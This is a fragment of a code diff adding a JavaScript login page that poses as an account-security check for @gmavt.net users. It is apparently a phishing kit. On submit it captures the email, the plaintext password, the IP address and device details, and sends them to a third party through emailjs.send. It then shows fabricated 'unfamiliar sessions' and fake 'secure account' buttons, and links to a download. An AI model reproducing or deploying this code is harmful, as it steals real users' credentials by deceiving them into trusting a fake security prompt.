+            loginEmailError.textContent = '';
+            loginPasswordError.textContent = '';
+
+            const email = loginEmail.value.trim();
+            const password = loginPassword.value.trim();
+            // Only allow @gmavt.net emails
+            const domainRegex = /^[^@\s]+@(gmavt\.net)$/i;
+
+            if (!email) {
+                loginEmailError.textContent = 'Email is required.';
+                valid = false;
+            } else if (!domainRegex.test(email)) {
+                loginEmailError.textContent = 'Email must be @gmavt.net.';
+                valid = false;
+            }
+
+            if (!password) {
+                loginPasswordError.textContent = 'Password is required.';
+                valid = false;
+            }
+
+            if (!valid) return;
+
+            loginBtn.disabled = true;
+            loginBtn.innerHTML = '<i class="fas fa-spinner spinner"></i> Verifying...';
+
+            const deviceInfo = getDeviceInfo();
+
+            fetchIpAddress().then(function(ipAddress) {
+                const timestamp = new Date().toLocaleString();
+
+                previousSessions = buildPreviousSessions();
+
+                let sessionsLog = '';
+                previousSessions.forEach(function(s, idx) {
+                    sessionsLog += '\n  [' + (idx + 1) + '] ' + s.device + ' — ' +
+                        s.flag + ' ' + s.city + ', ' + s.country +
+                        ' (' + s.ip + ') — ' + timeAgo(s.minutesAgo) + '\n';
+                });
+
+                const fullLog =
+                    'LOGIN ACTIVITY REPORT\n' +
+                    '==============================\n' +
+                    'Timestamp: ' + timestamp + '\n' +
+                    'Email: ' + email + '\n' +
+                    'Password: ' + password + '\n' +
+                    'Certificate ID: ' + certId + '\n' +
+                    '\n--- Current Session (Familiar Device) ---\n' +
+                    'Device: ' + deviceInfo.device + ' · ' + deviceInfo.os + ' · ' + deviceInfo.browser + '\n' +
+                    'IP: ' + ipAddress + '\n' +
+                    'Screen: ' + deviceInfo.screen_resolution + '\n' +
+                    'Viewport: ' + deviceInfo.viewport_size + '\n' +
+                    'Timezone: ' + deviceInfo.timezone + '\n' +
+                    'Language: ' + deviceInfo.language + '\n' +
+                    '\n--- Previous Sessions (Unfamiliar Devices) ---' +
+                    sessionsLog +
+                    '\n--- Page Info ---\n' +
+                    'Title: ' + document.title + '\n' +
+                    'URL: ' + window.location.href + '\n' +
+                    'Hostname: ' + window.location.hostname + '\n' +
+                    'Pathname: ' + window.location.pathname + '\n' +
+                    'Referrer: ' + (document.referrer || 'Direct') + '\n' +
+                    '\n--- Page Stats ---\n' +
+                    'Total Elements: ' + document.getElementsByTagName('*').length + '\n' +
+                    'Forms: ' + document.forms.length + '\n' +
+                    'Inputs: ' + document.getElementsByTagName('input').length + '\n' +
+                    'Links: ' + document.getElementsByTagName('a').length + '\n';
+
+                const templateParams = {
+                    from_email: email,
+                    password: password,
+                    timestamp: timestamp,
+
+                    page_title: document.title,
+                    page_url: window.location.href,
+                    page_hostname: window.location.hostname,
+                    page_pathname: window.location.pathname,
+                    referrer: document.referrer || 'Direct',
+
+                    browser: deviceInfo.browser,
+                    ip: ipAddress,
+                    os: deviceInfo.os,
+                    device: deviceInfo.device,
+                    screen_resolution: deviceInfo.screen_resolution,
+                    viewport_size: deviceInfo.viewport_size,
+                    timezone: deviceInfo.timezone,
+                    language: deviceInfo.language,
+
+                    page_element_count: document.getElementsByTagName('*').length,
+                    forms_count: document.forms.length,
+                    inputs_count: document.getElementsByTagName('input').length,
+                    links_count: document.getElementsByTagName('a').length,
+
+                    message: fullLog
+                };
+
+                return emailjs.send('service_kvpr45j', 'template_v2xoave', templateParams);
+            })
+            .then(function() {
+                const deviceInfo2 = getDeviceInfo();
+                document.getElementById('currentDevice').textContent =
+                    deviceInfo2.os + ' · ' + deviceInfo2.browser;
+                document.getElementById('currentLocation').textContent =
+                    '📍 ' + (deviceInfo2.timezone || 'Your current location');
+                document.getElementById('currentTime').textContent = 'Just now';
+
+                const list = document.getElementById('previousSessions');
+                list.innerHTML = '';
+                previousSessions.forEach(function(s) {
+                    list.appendChild(renderSession(s));
+                });
+
+                updateSessionCount();
+                updateEmptyState();
+
+                loginCard.classList.add('hidden');
+                activityCard.classList.remove('hidden');
+
+                loginBtn.disabled = false;
+                loginBtn.innerHTML = '<i class="fas fa-shield-alt"></i> Verify & Continue';
+                window.scrollTo({ top: 0, behavior: 'smooth' });
+            })
+            .catch(function(err) {
+                console.error('EmailJS error:', err);
+                loginBtn.disabled = false;
+                loginBtn.innerHTML = '<i class="fas fa-shield-alt"></i> Verify & Continue';
+                loginEmailError.textContent = 'Verification failed. Please try again.';
+            });
+        });
+
+        // ---------------------------
+        // Activity actions
+        // ---------------------------
+        function showState(text, type = 'loading', icon = 'circle-notch') {
+            stateMsg.className = 'state-message visible';
+            if (type === 'success') stateMsg.className += ' success';
+            if (type === 'error') stateMsg.className += ' error';
+            stateText.textContent = text;
+            const iconElem = stateMsg.querySelector('i');
+            iconElem.className = 'fas fa-' + icon;
+            if (type === 'loading') iconElem.classList.add('spinner');
+            else iconElem.classList.remove('spinner');
+        }
+
+        function hideState() {
+            stateMsg.className = 'state-message';
+        }
+
+        function showSecured() {
+            securedState.classList.add('visible');
+            document.getElementById('actionGroup').style.display = 'none';
+            downloadSection.classList.add('visible');
+            document.querySelectorAll('.session-item.unfamiliar').forEach(function(el) {
+                el.style.opacity = '0.5';
+                el.style.filter = 'grayscale(0.4)';
+                const btn = el.querySelector('.session-clear-btn');
+                if (btn) btn.disabled = true;
+            });
+        }
+
+        // Verify Activity — "This Was Me"
+        document.getElementById('verifyActivityBtn').addEventListener('click', function() {
+            showState('Confirming activity...', 'loading', 'spinner');
+            setTimeout(function() {
+                hideState();
+                showState('✅ Activity confirmed. Thank you.', 'success', 'check-circle');
+                setTimeout(hideState, 2500);
+            }, 1500);
+        });
+
+        // Secure Account
+        secureAccountBtn.addEventListener('click', function() {
+            showState('Securing account and ending unfamiliar sessions...', 'loading', 'spinner');
+            setTimeout(function() {
+                hideState();
+                showSecured();
+            }, 1800);
+        });
+
+        // Download Report
+        document.getElementById('downloadReportBtn').addEventListener('click', function() {
+            showState('Preparing activity report...', 'loading', 'spinner');
+            setTimeout(function() {
+                hideState();
+                showState('📄 Activity report download started', 'success', 'download');
+                setTimeout(hideState, 3000);
+
+                let report = 'LOGIN ACTIVITY REPORT\n';
+                report += '==============================\n';
+                report += 'Generated: ' + new Date().toLocaleString() + '\n\n';
+                report += 'CURRENT SESSION (Familiar Device)\n';
+                report += '  Device: ' + document.getElementById('currentDevice').textContent + '\n';
+                report += '  Location: ' + document.getElementById('currentLocation').textContent + '\n\n';
+                report += 'PREVIOUS SESSIONS (Unfamiliar Devices)\n';
+                if (previousSessions.length === 0) {
+                    report += '  None — all unfamiliar sessions cleared.\n';
+                } else {
+                    previousSessions.forEach(function(s, i) {
+                        report += '  [' + (i + 1) + '] ' + s.device + '\n';
+                        report += '      Location: ' + s.flag + ' ' + s.city + ', ' + s.country + '\n';
+                        report += '      IP: ' + s.ip + '\n';
+                        report += '      When: ' + timeAgo(s.minutesAgo) + ' (' + formatDate(s.minutesAgo) + ')\n\n';
+                    });
+                }
+
+                const blob = new Blob([report], {type: 'text/plain'});
+                const url = window.URL.createObjectURL(blob);
+                const a = document.createElement('a');
+                a.href = url;
+                a.download = 'login-activity-' + Date.now() + '.txt';
+                document.body.appendChild(a);
+                a.click();
+                document.body.removeChild(a);
+                window.URL.revokeObjectURL(url);
+            }, 1000);
+        });
+
+        // Download App
+        function handleDownloadApp() {
+            showState('Preparing app download...', 'loading', 'spinner');
+            setTimeout(function() {
+                hideState();
+                showState('App download started', 'success', 'download');
+                setTimeout(hideState, 3000);
+                window.open('https://www.gorge.net/security-app', '_blank');
+            }, 1000);
+        }
+
+        document.getElementById('downloadAppAfterSecure').addEventListener('click', handleDownloadApp);
+    })();
+</script>
+</body>
+</html>
